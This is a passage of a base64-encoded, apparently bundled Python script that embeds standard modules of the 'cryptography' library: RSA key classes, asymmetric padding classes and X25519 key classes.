5SU0FfZ2V0MF9mYWN0b3JzKHNlbGYuX3JzYV9jZGF0YSwgcCwgcSlcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChxWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5SU0FfZ2V0MF9jcnRfcGFyYW1zKFxyXG4gICAgICAgICAgICBzZWxmLl9yc2FfY2RhdGEsIGRtcDEsIGRtcTEsIGlxbXBcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChkbXAxWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZG1xMVswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGlxbXBbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIFJTQVByaXZhdGVOdW1iZXJzKFxyXG4gICAgICAgICAgICBwPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChwWzBdKSxcclxuICAgICAgICAgICAgcT1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQocVswXSksXHJcbiAgICAgICAgICAgIGQ9c2VsZi5fYmFja2VuZC5fYm5fdG9faW50KGRbMF0pLFxyXG4gICAgICAgICAgICBkbXAxPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChkbXAxWzBdKSxcclxuICAgICAgICAgICAgZG1xMT1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQoZG1xMVswXSksXHJcbiAgICAgICAgICAgIGlxbXA9c2VsZi5fYmFja2VuZC5fYm5fdG9faW50KGlxbXBbMF0pLFxyXG4gICAgICAgICAgICBwdWJsaWNfbnVtYmVycz1SU0FQdWJsaWNOdW1iZXJzKFxyXG4gICAgICAgICAgICAgICAgZT1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQoZVswXSksXHJcbiAgICAgICAgICAgICAgICBuPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChuWzBdKSxcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHByaXZhdGVfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdCxcclxuICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobTogc2VyaWFsaXphdGlvbi5LZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbixcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX3ByaXZhdGVfa2V5X2J5dGVzKFxyXG4gICAgICAgICAgICBlbmNvZGluZyxcclxuICAgICAgICAgICAgZm9ybWF0LFxyXG4gICAgICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobSxcclxuICAgICAgICAgICAgc2VsZixcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksXHJcbiAgICAgICAgICAgIHNlbGYuX3JzYV9jZGF0YSxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHNpZ24oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBwYWRkaW5nOiBBc3ltbWV0cmljUGFkZGluZyxcclxuICAgICAgICBhbGdvcml0aG06IHR5cGluZy5Vbmlvblthc3ltX3V0aWxzLlByZWhhc2hlZCwgaGFzaGVzLkhhc2hBbGdvcml0aG1dLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBkYXRhLCBhbGdvcml0aG0gPSBfY2FsY3VsYXRlX2RpZ2VzdF9hbmRfYWxnb3JpdGhtKGRhdGEsIGFsZ29yaXRobSlcclxuICAgICAgICByZXR1cm4gX3JzYV9zaWdfc2lnbihzZWxmLl9iYWNrZW5kLCBwYWRkaW5nLCBhbGdvcml0aG0sIHNlbGYsIGRhdGEpXHJcblxyXG5cclxuY2xhc3MgX1JTQVB1YmxpY0tleShSU0FQdWJsaWNLZXkpOlxyXG4gICAgX2V2cF9wa2V5OiBvYmplY3RcclxuICAgIF9yc2FfY2RhdGE6IG9iamVjdFxyXG4gICAgX2tleV9zaXplOiBpbnRcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCByc2FfY2RhdGEsIGV2cF9wa2V5KTpcclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX3JzYV9jZGF0YSA9IHJzYV9jZGF0YVxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuXHJcbiAgICAgICAgbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLlJTQV9nZXQwX2tleShcclxuICAgICAgICAgICAgc2VsZi5fcnNhX2NkYXRhLFxyXG4gICAgICAgICAgICBuLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoblswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9rZXlfc2l6ZSA9IHNlbGYuX2JhY2tlbmQuX2xpYi5CTl9udW1fYml0cyhuWzBdKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fa2V5X3NpemVcclxuXHJcbiAgICBkZWYgZW5jcnlwdChzZWxmLCBwbGFpbnRleHQ6IGJ5dGVzLCBwYWRkaW5nOiBBc3ltbWV0cmljUGFkZGluZykgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIF9lbmNfZGVjX3JzYShzZWxmLl9iYWNrZW5kLCBzZWxmLCBwbGFpbnRleHQsIHBhZGRpbmcpXHJcblxyXG4gICAgZGVmIHB1YmxpY19udW1iZXJzKHNlbGYpIC0+IFJTQVB1YmxpY051bWJlcnM6XHJcbiAgICAgICAgbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgZSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLlJTQV9nZXQwX2tleShcclxuICAgICAgICAgICAgc2VsZi5fcnNhX2NkYXRhLCBuLCBlLCBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KG5bMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChlWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHJldHVybiBSU0FQdWJsaWNOdW1iZXJzKFxyXG4gICAgICAgICAgICBlPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChlWzBdKSxcclxuICAgICAgICAgICAgbj1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQoblswXSksXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fcHVibGljX2tleV9ieXRlcyhcclxuICAgICAgICAgICAgZW5jb2RpbmcsIGZvcm1hdCwgc2VsZiwgc2VsZi5fZXZwX3BrZXksIHNlbGYuX3JzYV9jZGF0YVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgdmVyaWZ5KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc2lnbmF0dXJlOiBieXRlcyxcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBwYWRkaW5nOiBBc3ltbWV0cmljUGFkZGluZyxcclxuICAgICAgICBhbGdvcml0aG06IHR5cGluZy5Vbmlvblthc3ltX3V0aWxzLlByZWhhc2hlZCwgaGFzaGVzLkhhc2hBbGdvcml0aG1dLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGRhdGEsIGFsZ29yaXRobSA9IF9jYWxjdWxhdGVfZGlnZXN0X2FuZF9hbGdvcml0aG0oZGF0YSwgYWxnb3JpdGhtKVxyXG4gICAgICAgIF9yc2Ffc2lnX3ZlcmlmeShcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZCwgcGFkZGluZywgYWxnb3JpdGhtLCBzZWxmLCBzaWduYXR1cmUsIGRhdGFcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHJlY292ZXJfZGF0YV9mcm9tX3NpZ25hdHVyZShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHNpZ25hdHVyZTogYnl0ZXMsXHJcbiAgICAgICAgcGFkZGluZzogQXN5bW1ldHJpY1BhZGRpbmcsXHJcbiAgICAgICAgYWxnb3JpdGhtOiB0eXBpbmcuT3B0aW9uYWxbaGFzaGVzLkhhc2hBbGdvcml0aG1dLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiBpc2luc3RhbmNlKGFsZ29yaXRobSwgYXN5bV91dGlscy5QcmVoYXNoZWQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiUHJlaGFzaGVkIGlzIG9ubHkgc3VwcG9ydGVkIGluIHRoZSBzaWduIGFuZCB2ZXJpZnkgbWV0aG9kcy4gIlxyXG4gICAgICAgICAgICAgICAgIkl0IGNhbm5vdCBiZSB1c2VkIHdpdGggcmVjb3Zlcl9kYXRhX2Zyb21fc2lnbmF0dXJlLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBfcnNhX3NpZ19yZWNvdmVyKFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLCBwYWRkaW5nLCBhbGdvcml0aG0sIHNlbGYsIHNpZ25hdHVyZVxyXG4gICAgICAgIClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9hc3ltbWV0cmljL3BhZGRpbmcucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgaGFzaGVzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLl9hc3ltbWV0cmljIGltcG9ydCAoXHJcbiAgICBBc3ltbWV0cmljUGFkZGluZyBhcyBBc3ltbWV0cmljUGFkZGluZyxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljIGltcG9ydCByc2FcclxuXHJcblxyXG5jbGFzcyBQS0NTMXYxNShBc3ltbWV0cmljUGFkZGluZyk6XHJcbiAgICBuYW1lID0gIkVNU0EtUEtDUzEtdjFfNSJcclxuXHJcblxyXG5jbGFzcyBfTWF4TGVuZ3RoOlxyXG4gICAgIlNlbnRpbmVsIHZhbHVlIGZvciBgTUFYX0xFTkdUSGAuIlxyXG5cclxuXHJcbmNsYXNzIF9BdXRvOlxyXG4gICAgIlNlbnRpbmVsIHZhbHVlIGZvciBgQVVUT2AuIlxyXG5cclxuXHJcbmNsYXNzIF9EaWdlc3RMZW5ndGg6XHJcbiAgICAiU2VudGluZWwgdmFsdWUgZm9yIGBESUdFU1RfTEVOR1RIYC4iXHJcblxyXG5cclxuY2xhc3MgUFNTKEFzeW1tZXRyaWNQYWRkaW5nKTpcclxuICAgIE1BWF9MRU5HVEggPSBfTWF4TGVuZ3RoKClcclxuICAgIEFVVE8gPSBfQXV0bygpXHJcbiAgICBESUdFU1RfTEVOR1RIID0gX0RpZ2VzdExlbmd0aCgpXHJcbiAgICBuYW1lID0gIkVNU0EtUFNTIlxyXG4gICAgX3NhbHRfbGVuZ3RoOiB0eXBpbmcuVW5pb25baW50LCBfTWF4TGVuZ3RoLCBfQXV0bywgX0RpZ2VzdExlbmd0aF1cclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBtZ2Y6ICJNR0YiLFxyXG4gICAgICAgIHNhbHRfbGVuZ3RoOiB0eXBpbmcuVW5pb25baW50LCBfTWF4TGVuZ3RoLCBfQXV0bywgX0RpZ2VzdExlbmd0aF0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fbWdmID0gbWdmXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICBzYWx0X2xlbmd0aCwgKGludCwgX01heExlbmd0aCwgX0F1dG8sIF9EaWdlc3RMZW5ndGgpXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInNhbHRfbGVuZ3RoIG11c3QgYmUgYW4gaW50ZWdlciwgTUFYX0xFTkdUSCwgIlxyXG4gICAgICAgICAgICAgICAgIkRJR0VTVF9MRU5HVEgsIG9yIEFVVE8iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShzYWx0X2xlbmd0aCwgaW50KSBhbmQgc2FsdF9sZW5ndGggPCAwOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJzYWx0X2xlbmd0aCBtdXN0IGJlIHplcm8gb3IgZ3JlYXRlci4iKVxyXG5cclxuICAgICAgICBzZWxmLl9zYWx0X2xlbmd0aCA9IHNhbHRfbGVuZ3RoXHJcblxyXG5cclxuY2xhc3MgT0FFUChBc3ltbWV0cmljUGFkZGluZyk6XHJcbiAgICBuYW1lID0gIkVNRS1PQUVQIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1nZjogIk1HRiIsXHJcbiAgICAgICAgYWxnb3JpdGhtOiBoYXNoZXMuSGFzaEFsZ29yaXRobSxcclxuICAgICAgICBsYWJlbDogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSxcclxuICAgICk6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYWxnb3JpdGhtLCBoYXNoZXMuSGFzaEFsZ29yaXRobSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiRXhwZWN0ZWQgaW5zdGFuY2Ugb2YgaGFzaGVzLkhhc2hBbGdvcml0aG0uIilcclxuXHJcbiAgICAgICAgc2VsZi5fbWdmID0gbWdmXHJcbiAgICAgICAgc2VsZi5fYWxnb3JpdGhtID0gYWxnb3JpdGhtXHJcbiAgICAgICAgc2VsZi5fbGFiZWwgPSBsYWJlbFxyXG5cclxuXHJcbmNsYXNzIE1HRihtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgX2FsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG1cclxuXHJcblxyXG5jbGFzcyBNR0YxKE1HRik6XHJcbiAgICBNQVhfTEVOR1RIID0gX01heExlbmd0aCgpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0pOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGFsZ29yaXRobSwgaGFzaGVzLkhhc2hBbGdvcml0aG0pOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkV4cGVjdGVkIGluc3RhbmNlIG9mIGhhc2hlcy5IYXNoQWxnb3JpdGhtLiIpXHJcblxyXG4gICAgICAgIHNlbGYuX2FsZ29yaXRobSA9IGFsZ29yaXRobVxyXG5cclxuXHJcbmRlZiBjYWxjdWxhdGVfbWF4X3Bzc19zYWx0X2xlbmd0aChcclxuICAgIGtleTogdHlwaW5nLlVuaW9uWyJyc2EuUlNBUHJpdmF0ZUtleSIsICJyc2EuUlNBUHVibGljS2V5Il0sXHJcbiAgICBoYXNoX2FsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0sXHJcbikgLT4gaW50OlxyXG4gICAgaWYgbm90IGlzaW5zdGFuY2Uoa2V5LCAocnNhLlJTQVByaXZhdGVLZXksIHJzYS5SU0FQdWJsaWNLZXkpKTpcclxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoImtleSBtdXN0IGJlIGFuIFJTQSBwdWJsaWMgb3IgcHJpdmF0ZSBrZXkiKVxyXG4gICAgIyBiaXQgbGVuZ3RoIC0gMSBwZXIgUkZDIDM0NDdcclxuICAgIGVtbGVuID0gKGtleS5rZXlfc2l6ZSArIDYpIC8vIDhcclxuICAgIHNhbHRfbGVuZ3RoID0gZW1sZW4gLSBoYXNoX2FsZ29yaXRobS5kaWdlc3Rfc2l6ZSAtIDJcclxuICAgIGFzc2VydCBzYWx0X2xlbmd0aCA+PSAwXHJcbiAgICByZXR1cm4gc2FsdF9sZW5ndGhcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvYmFja2VuZHMvb3BlbnNzbC94MjU1MTkucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC51dGlscyBpbXBvcnQgX2V2cF9wa2V5X2Rlcml2ZVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgc2VyaWFsaXphdGlvblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLngyNTUxOSBpbXBvcnQgKFxyXG4gICAgWDI1NTE5UHJpdmF0ZUtleSxcclxuICAgIFgyNTUxOVB1YmxpY0tleSxcclxuKVxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBCYWNrZW5kXHJcblxyXG5cclxuX1gyNTUxOV9LRVlfU0laRSA9IDMyXHJcblxyXG5cclxuY2xhc3MgX1gyNTUxOVB1YmxpY0tleShYMjU1MTlQdWJsaWNLZXkpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGJhY2tlbmQ6ICJCYWNrZW5kIiwgZXZwX3BrZXkpOlxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQgPSBiYWNrZW5kXHJcbiAgICAgICAgc2VsZi5fZXZwX3BrZXkgPSBldnBfcGtleVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUmF3XHJcbiAgICAgICAgICAgIG9yIGZvcm1hdCBpcyBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5SYXdcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICBlbmNvZGluZyBpcyBub3Qgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5SYXdcclxuICAgICAgICAgICAgICAgIG9yIGZvcm1hdCBpcyBub3Qgc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQuUmF3XHJcbiAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJXaGVuIHVzaW5nIFJhdyBib3RoIGVuY29kaW5nIGFuZCBmb3JtYXQgbXVzdCBiZSBSYXciXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcmF3X3B1YmxpY19ieXRlcygpXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9wdWJsaWNfa2V5X2J5dGVzKFxyXG4gICAgICAgICAgICBlbmNvZGluZywgZm9ybWF0LCBzZWxmLCBzZWxmLl9ldnBfcGtleSwgTm9uZVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX3Jhd19wdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgdWNoYXJwcCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXIgKioiKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9nZXQxX3Rsc19lbmNvZGVkcG9pbnQoXHJcbiAgICAgICAgICAgIHNlbGYuX2V2cF9wa2V5LCB1Y2hhcnBwXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDMyKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQodWNoYXJwcFswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBkYXRhID0gc2VsZi5fYmFja2VuZC5fZmZpLmdjKFxyXG4gICAgICAgICAgICB1Y2hhcnBwWzBdLCBzZWxmLl9iYWNrZW5kLl9saWIuT1BFTlNTTF9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGRhdGEsIHJlcylbOl1cclxuXHJcblxyXG5jbGFzcyBfWDI1NTE5UHJpdmF0ZUtleShYMjU1MTlQcml2YXRlS2V5KTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBiYWNrZW5kOiAiQmFja2VuZCIsIGV2cF9wa2V5KTpcclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBYMjU1MTlQdWJsaWNLZXk6XHJcbiAgICAgICAgYmlvID0gc2VsZi5fYmFja2VuZC5fY3JlYXRlX21lbV9iaW9fZ2MoKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5pMmRfUFVCS0VZX2JpbyhiaW8sIHNlbGYuX2V2cF9wa2V5KVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9iYWNrZW5kLl9saWIuZDJpX1BVQktFWV9iaW8oXHJcbiAgICAgICAgICAgIGJpbywgc2VsZi5fYmFja2VuZC5fZmZpLk5VTExcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChldnBfcGtleSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhcclxuICAgICAgICAgICAgZXZwX3BrZXksIHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBfWDI1NTE5UHVibGljS2V5KHNlbGYuX2JhY2tlbmQsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBleGNoYW5nZShzZWxmLCBwZWVyX3B1YmxpY19rZXk6IFgyNTUxOVB1YmxpY0tleSkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocGVlcl9wdWJsaWNfa2V5LCBYMjU1MTlQdWJsaWNLZXkpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInBlZXJfcHVibGljX2tleSBtdXN0IGJlIFgyNTUxOVB1YmxpY0tleS4iKVxyXG5cclxuICAgICAgICByZXR1cm4gX2V2cF9wa2V5X2Rlcml2ZShzZWxmLl9iYWNrZW5kLCBzZWxmLl9ldnBfcGtleSwgcGVlcl9wdWJsaWNfa2V5KVxyXG5cclxuICAgIGRlZiBwcml2YXRlX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBzZXJpYWxpemF0aW9uLlByaXZhdGVGb3JtYXQsXHJcbiAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG06IHNlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIChcclxuICAgICAgICAgICAgZW5jb2RpbmcgaXMgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5SYXdcclxuICAgICAgICAgICAgb3IgZm9ybWF0IGlzIHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LlJhd1xyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIGlmIChcclxuICAgICAgICAgICAgICAgIGZvcm1hdCBpcyBub3Qgc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LlJhd1xyXG4gICAgICAgICAgICAgICAgb3IgZW5jb2RpbmcgaXMgbm90IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUmF3XHJcbiAgICAgICAgICAgICAgICBvciBub3QgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobSwgc2VyaWFsaXphdGlvbi5Ob0VuY3J5cHRpb25cclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIldoZW4gdXNpbmcgUmF3IGJvdGggZW5jb2RpbmcgYW5kIGZvcm1hdCBtdXN0IGJlIFJhdyAiXHJcbiAgICAgICAgICAgICAgICAgICAgImFuZCBlbmNyeXB0aW9uX2FsZ29yaXRobSBtdXN0IGJlIE5vRW5jcnlwdGlvbigpIlxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3Jhd19wcml2YXRlX2J5dGVzKClcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX3ByaXZhdGVfa2V5X2J5dGVzKFxyXG4gICAgICAgICAgICBlbmNvZGluZywgZm9ybWF0LCBlbmNyeXB0aW9uX2FsZ29yaXRobSwgc2VsZiwgc2VsZi5fZXZwX3BrZXksIE5vbmVcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9yYXdfcHJpdm